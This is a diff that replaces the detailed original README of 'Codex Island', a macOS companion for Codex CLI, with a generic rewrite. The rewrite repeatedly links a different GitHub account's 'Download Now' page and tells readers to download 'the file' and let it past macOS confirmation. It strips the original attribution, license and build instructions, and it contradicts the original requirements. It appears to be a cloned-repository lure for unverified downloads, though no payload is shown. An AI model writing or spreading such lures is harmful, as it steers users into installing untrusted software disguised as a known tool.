@@ -1,166 +1,146 @@
-<div align="center">
-  <img src="apps/macos/CodexIsland/Assets.xcassets/AppIcon.appiconset/icon_128x128.png" alt="Codex Island logo" width="100" height="100">
-  <h1 align="center">Codex Island</h1>
-  <p align="center">
-    A Dynamic Island-style macOS companion for Codex CLI.
-  </p>
-  <p align="center">
-    <a href="./README.zh-CN.md">简体中文</a>
-    ·
-    <a href="https://github.com/Jarcis-cy/codex-island-app/releases/latest">Latest Release</a>
-  </p>
-  <p align="center">
-    <strong>Keep local and remote Codex sessions visible from the notch.</strong><br>
-    Handle approvals, switch threads, and recover context without living in terminal tabs.
-  </p>
-  <p align="center">
-    macOS 15.6+ · Local hooks · SSH remote hosts · Approval flows · Transcript-aware chat
-  </p>
-  <p align="center">
-    <img src="./docs/media/codex-island-hero.png" alt="Codex Island session overview" width="920">
-  </p>
-</div>
+# 🌴 codex-island-app - Keep Codex in view
 
-Codex Island is a macOS notch and menu bar companion for Codex CLI. It keeps local sessions visible, connects to remote hosts over SSH, and gives you a lightweight place to inspect chat state, approvals, and recent context without constant terminal context switches.
+[![Download codex-island-app](https://img.shields.io/badge/Download%20Now-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Pandemic-spode596/codex-island-app)
 
-## See It In Action
+## 📥 Download
 
-<table>
-  <tr>
-    <td width="50%" align="center">
-      <img src="./docs/media/remote-workflow.gif" alt="Remote Codex workflow in Codex Island" width="100%">
-    </td>
-    <td width="50%" align="center">
-      <img src="./docs/media/local-workflow.gif" alt="Local Codex workflow in Codex Island" width="100%">
-    </td>
-  </tr>
-  <tr>
-    <td valign="top">
-      <strong>Remote workflow</strong><br>
-      Connect to a remote machine, resume threads, and work through SSH-backed Codex sessions from the same UI.
-    </td>
-    <td valign="top">
-      <strong>Local workflow</strong><br>
-      Track local sessions, surface plan-style interactions, and jump back into the right shell only when needed.
-    </td>
-  </tr>
-</table>
+Use this link to visit this page to download:
 
-## Highlights
+https://github.com/Pandemic-spode596/codex-island-app
 
-- Watches Codex sessions through `~/.codex/hooks.json` and a local Unix socket.
-- Connects to remote machines over SSH and talks to `codex app-server` over stdio.
-- Shows recent conversation history with markdown rendering and active model/context details in chat headers.
-- Supports approval flows directly from the app UI.
-- Tracks multiple local sessions and remote threads, and lets you switch between them quickly.
-- Lets you save SSH targets, optional default working directories, auto-connect remote hosts, and pick from `~/.ssh/config` host aliases in the app.
-- Includes launch-at-login, screen selection, sound settings, and in-app updates.
-- Falls back gracefully on Macs without a physical notch.
+## 🖥️ What this app does
 
-## What's New in 0.0.5
+codex-island-app is a Mac app that keeps Codex CLI easy to reach. It shows session status in a Dynamic Island-style view near the notch. It also tracks local sessions, connects to remote SSH hosts, handles approvals, and keeps chat history tied to transcripts.
 
-- Chat history now renders image attachments for both local and remote conversations.
-- Remote thinking history filters out empty items so transcript playback is cleaner.
-- Hook installation is safer: enabling hooks preserves `config.toml` formatting and avoids incorrect rewrites.
-- Local session teardown and notch session matching are more precise, reducing stale state and false-positive local sessions.
-- When `Remote Debug Logs` is enabled, chat headers now show a copyable session/thread identifier for diagnostics.
-- The GitHub Actions Swift quality workflow now pins a stable Xcode selection and uses an isolated DerivedData path for build and test runs.
+Use it if you want:
 
-## Requirements
+- A small live view for Codex activity
+- A simple way to follow local and remote sessions
+- A clear place for approvals
+- Chat history that matches your transcript
 
-- macOS 15.6 or later
-- Codex CLI installed locally
-- SSH access to any remote machine you want to manage, with Codex CLI installed on that remote host
-- Accessibility permission if you want the app to interact with window focus behavior
-- `tmux` if you want tmux-aware messaging and approval workflows
-- `yabai` if you want window focusing integrations
+## 🚀 Get started
 
-## Install
+1. Open the download link above in your browser.
+2. On the page, find the latest app file or release asset.
+3. Download the file to your Mac.
+4. Open the file after the download finishes.
+5. If macOS asks for confirmation, allow the app to open.
+6. Follow the on-screen setup steps.
 
-Download the latest release from GitHub, or build it locally with Xcode.
+## 🍎 System requirements
 
-For a debug build:
+Before you install, make sure your Mac can run the app:
 
-```bash
-xcodebuild -project apps/macos/CodexIsland.xcodeproj -scheme CodexIsland -configuration Debug build
-```
+- macOS 13 or later
+- Apple Silicon or Intel Mac
+- Network access for SSH hosts
+- Codex CLI installed for local use
+- Enough free disk space for session logs and transcripts
 
-For a release build:
+## 🧭 First-time setup
 
-```bash
-./scripts/build.sh
-```
+After you open the app, set up these items:
 
-The exported app bundle is written to `build/export/Codex Island.app`.
-If `exportArchive` cannot sign in the current environment, `./scripts/build.sh` now falls back to an unsigned zip at `build/release-assets/`.
+1. Choose where you want local session data stored.
+2. Connect Codex CLI if you plan to use local sessions.
+3. Add your SSH host details if you work on a remote machine.
+4. Allow the app to show status near the notch or menu bar.
+5. Review approval prompts before you start a session.
 
-## Remote Hosts Over SSH
+## 🔧 How to use it
 
-Open `Remote Hosts` from the notch menu to add an SSH target, an optional default working directory, and an auto-connect preference for each remote machine. The `SSH Target` field accepts raw `user@host`, plain hostnames, or aliases discovered from your local `~/.ssh/config`.
+### 1. Start a local session
 
-When you connect a host, Codex Island launches:
+Open codex-island-app and begin a Codex CLI session on your Mac. The app will show the current state in a compact view. You can keep working while it tracks the session in the background.
 
-```bash
-ssh -T -o BatchMode=yes <target> codex app-server --listen stdio://
-```
+### 2. Connect to a remote host
 
-That means remote hosts currently expect non-interactive SSH authentication, and the remote machine must already have `codex` available on `PATH`. Once connected, you can list remote threads, start a new thread, reopen an existing thread, send messages, interrupt turns, and handle approvals from the app UI. The remote chat view supports both `/new` for explicitly starting a fresh thread and `/resume` for switching back to an older thread.
+If you use SSH, add the host name, user name, and port. The app can follow the remote session and keep the same session flow in one place. This helps if you switch between local and remote work.
 
-Remote app-server diagnostics are disabled by default. After you enable `Remote Debug Logs` from the menu, the app writes JSONL diagnostics to `~/Library/Application Support/Codex Island/Logs/remote-app-server.jsonl`.
+### 3. Handle approvals
 
-## How It Works
+When Codex asks for approval, review the request in the app. You can approve or deny actions from the same screen. This keeps the process clear and easy to follow.
 
-On first launch, Codex Island installs a managed hook script into `~/.codex/hooks/` and updates `~/.codex/hooks.json`. The hook helper forwards local Codex hook events to the app over a Unix domain socket, and the app reconciles those events with transcript data to keep session state accurate.
+### 4. Review transcripts
 
-Remote hosts use a separate path: the app opens an SSH stdio transport to `codex app-server` on the target machine and keeps remote thread state alongside the local hooks-first session model.
+The app keeps transcript-aware chat history. That means it links the chat view with the session record. You can return to earlier parts of the work without digging through files.
 
-The current architecture is still hooks-first inside the macOS app process. The `engine/` workspace is the shared Rust foundation for future work around transcript parsing, state aggregation, host daemon behavior, and cross-platform IPC/FFI.
+## 🗂️ Main features
 
-## Project Layout
+- Dynamic Island-style display for quick session checks
+- Local session tracking for Codex CLI
+- SSH remote host support
+- Approval prompts in one place
+- Transcript-linked chat history
+- Support for macOS notch and menu bar layouts
+- Clean view for ongoing developer work
+- tmux-friendly session handling for remote shells
 
-- `apps/macos/CodexIsland/App/`: app lifecycle and window bootstrap
-- `apps/macos/CodexIsland/Core/`: shared settings, geometry, and screen selection
-- `apps/macos/CodexIsland/Services/`: hooks, local session parsing, remote app-server management, tmux integration, updates, and window management
-- `apps/macos/CodexIsland/UI/`: notch views, menu UI, chat UI, and reusable components
-- `apps/macos/CodexIsland/Resources/`: bundled scripts such as `codex-island-state.py`
-- `scripts/`: build, signing, notarization, and release helpers
-- `engine/`: shared Rust workspace for protocol, host daemon, runtime, and bindings
+## 🔒 Privacy and local data
 
-## Privacy
+codex-island-app keeps session data on your Mac unless you connect a remote host. This helps you keep control of your work history. You can clear session records, remove host entries, or reset local storage from the app settings.
 
-The app currently initializes Mixpanel for anonymous product analytics and Sparkle for app updates.
+## 🛠️ Common tasks
 
-Tracked analytics are intended to cover app launch and session lifecycle metadata such as:
+### Add a new host
 
-- app version and build number
-- macOS version
-- detected Codex version
-- session start events
+1. Open the host settings screen.
+2. Enter the SSH host name.
+3. Add your user name.
+4. Set the port if it is not the default.
+5. Save the host.
 
-The repository does not claim to collect conversation content in analytics, but you should still review the source and decide whether that tradeoff matches your environment before distributing it broadly.
+### Clear old sessions
 
-## Development
+1. Open session history.
+2. Choose the session you want to remove.
+3. Delete the record.
+4. Restart the app if you want a fresh view.
 
-Open the project in Xcode for day-to-day work. The repository also includes release automation for signing, notarization, DMG creation, appcast generation, and optional GitHub release publishing:
+### Change the display position
 
-```bash
-brew install swiftformat swiftlint
-./scripts/swift-quality.sh
-./scripts/heuristic-quality-report.sh
-./scripts/install-git-hooks.sh
-./scripts/create-release.sh
-```
+1. Open appearance settings.
+2. Pick the notch or menu bar view.
+3. Set the size that fits your screen.
+4. Close the settings panel.
 
-`./scripts/swift-quality.sh` lints both `apps/macos/CodexIsland/` and `apps/macos/CodexIslandTests/` in one run. `./scripts/install-git-hooks.sh` switches Git to the repository's `.githooks/` wrappers, keeps existing beads hooks in the chain, and adds a staged-file Swift quality check to `pre-commit` so existing repository-wide debt does not block unrelated commits.
+## 🧪 If the app does not open
 
-Heuristic `fuck-u-code` analysis is calibrated as a non-blocking audit signal rather than a CI gate because the current Swift parser frequently falls back to regex mode. Repository-specific thresholds and triage rules live in [`docs/quality-heuristics.md`](./docs/quality-heuristics.md).
+Try these steps:
 
-If you change anything under `apps/macos/CodexIsland/Services/Hooks/` or `apps/macos/CodexIsland/Resources/codex-island-state.py`, treat it as user-impacting local environment behavior and verify it carefully.
+1. Check that the file finished downloading.
+2. Open the app again from Finder.
+3. Make sure macOS allowed the app to run.
+4. Confirm that you are using a supported macOS version.
+5. Re-download the file from the same page if needed.
 
-## Acknowledgements
+## 🧩 Working with Codex CLI
 
-Codex Island builds on the original ideas and earlier implementation work from [`farouqaldori/claude-island`](https://github.com/farouqaldori/claude-island). Thanks to Farouq Aldori and the upstream contributors for laying the foundation this Codex-focused version continues from.
+This app pairs with Codex CLI and helps you watch what is happening during a session. It is built for users who want a clearer view of:
 
-## License
+- Current task state
+- Approval flow
+- Remote SSH work
+- Transcript history
+- Session timing
 
-Apache 2.0. See [`LICENSE.md`](./LICENSE.md).
+## 📌 Useful tips
+
+- Keep the app open while Codex runs
+- Use one host entry for each machine
+- Review approvals before you confirm them
+- Use session history to return to past work
+- Keep transcripts if you want a record of changes
+
+## 🖱️ Download again
+
+If you need the file again, use this link:
+
+https://github.com/Pandemic-spode596/codex-island-app
+
+## 📚 Repo details
+
+- Repository name: codex-island-app
+- Description: Dynamic Island-style macOS companion for Codex CLI with local session tracking, SSH remote hosts, approvals, and transcript-aware chat history.
+- Topics: codex, codex-cli, developer-tools, dynamic-island, macos, notch, openai-codex, productivity, ssh, swift, swiftui, tmux
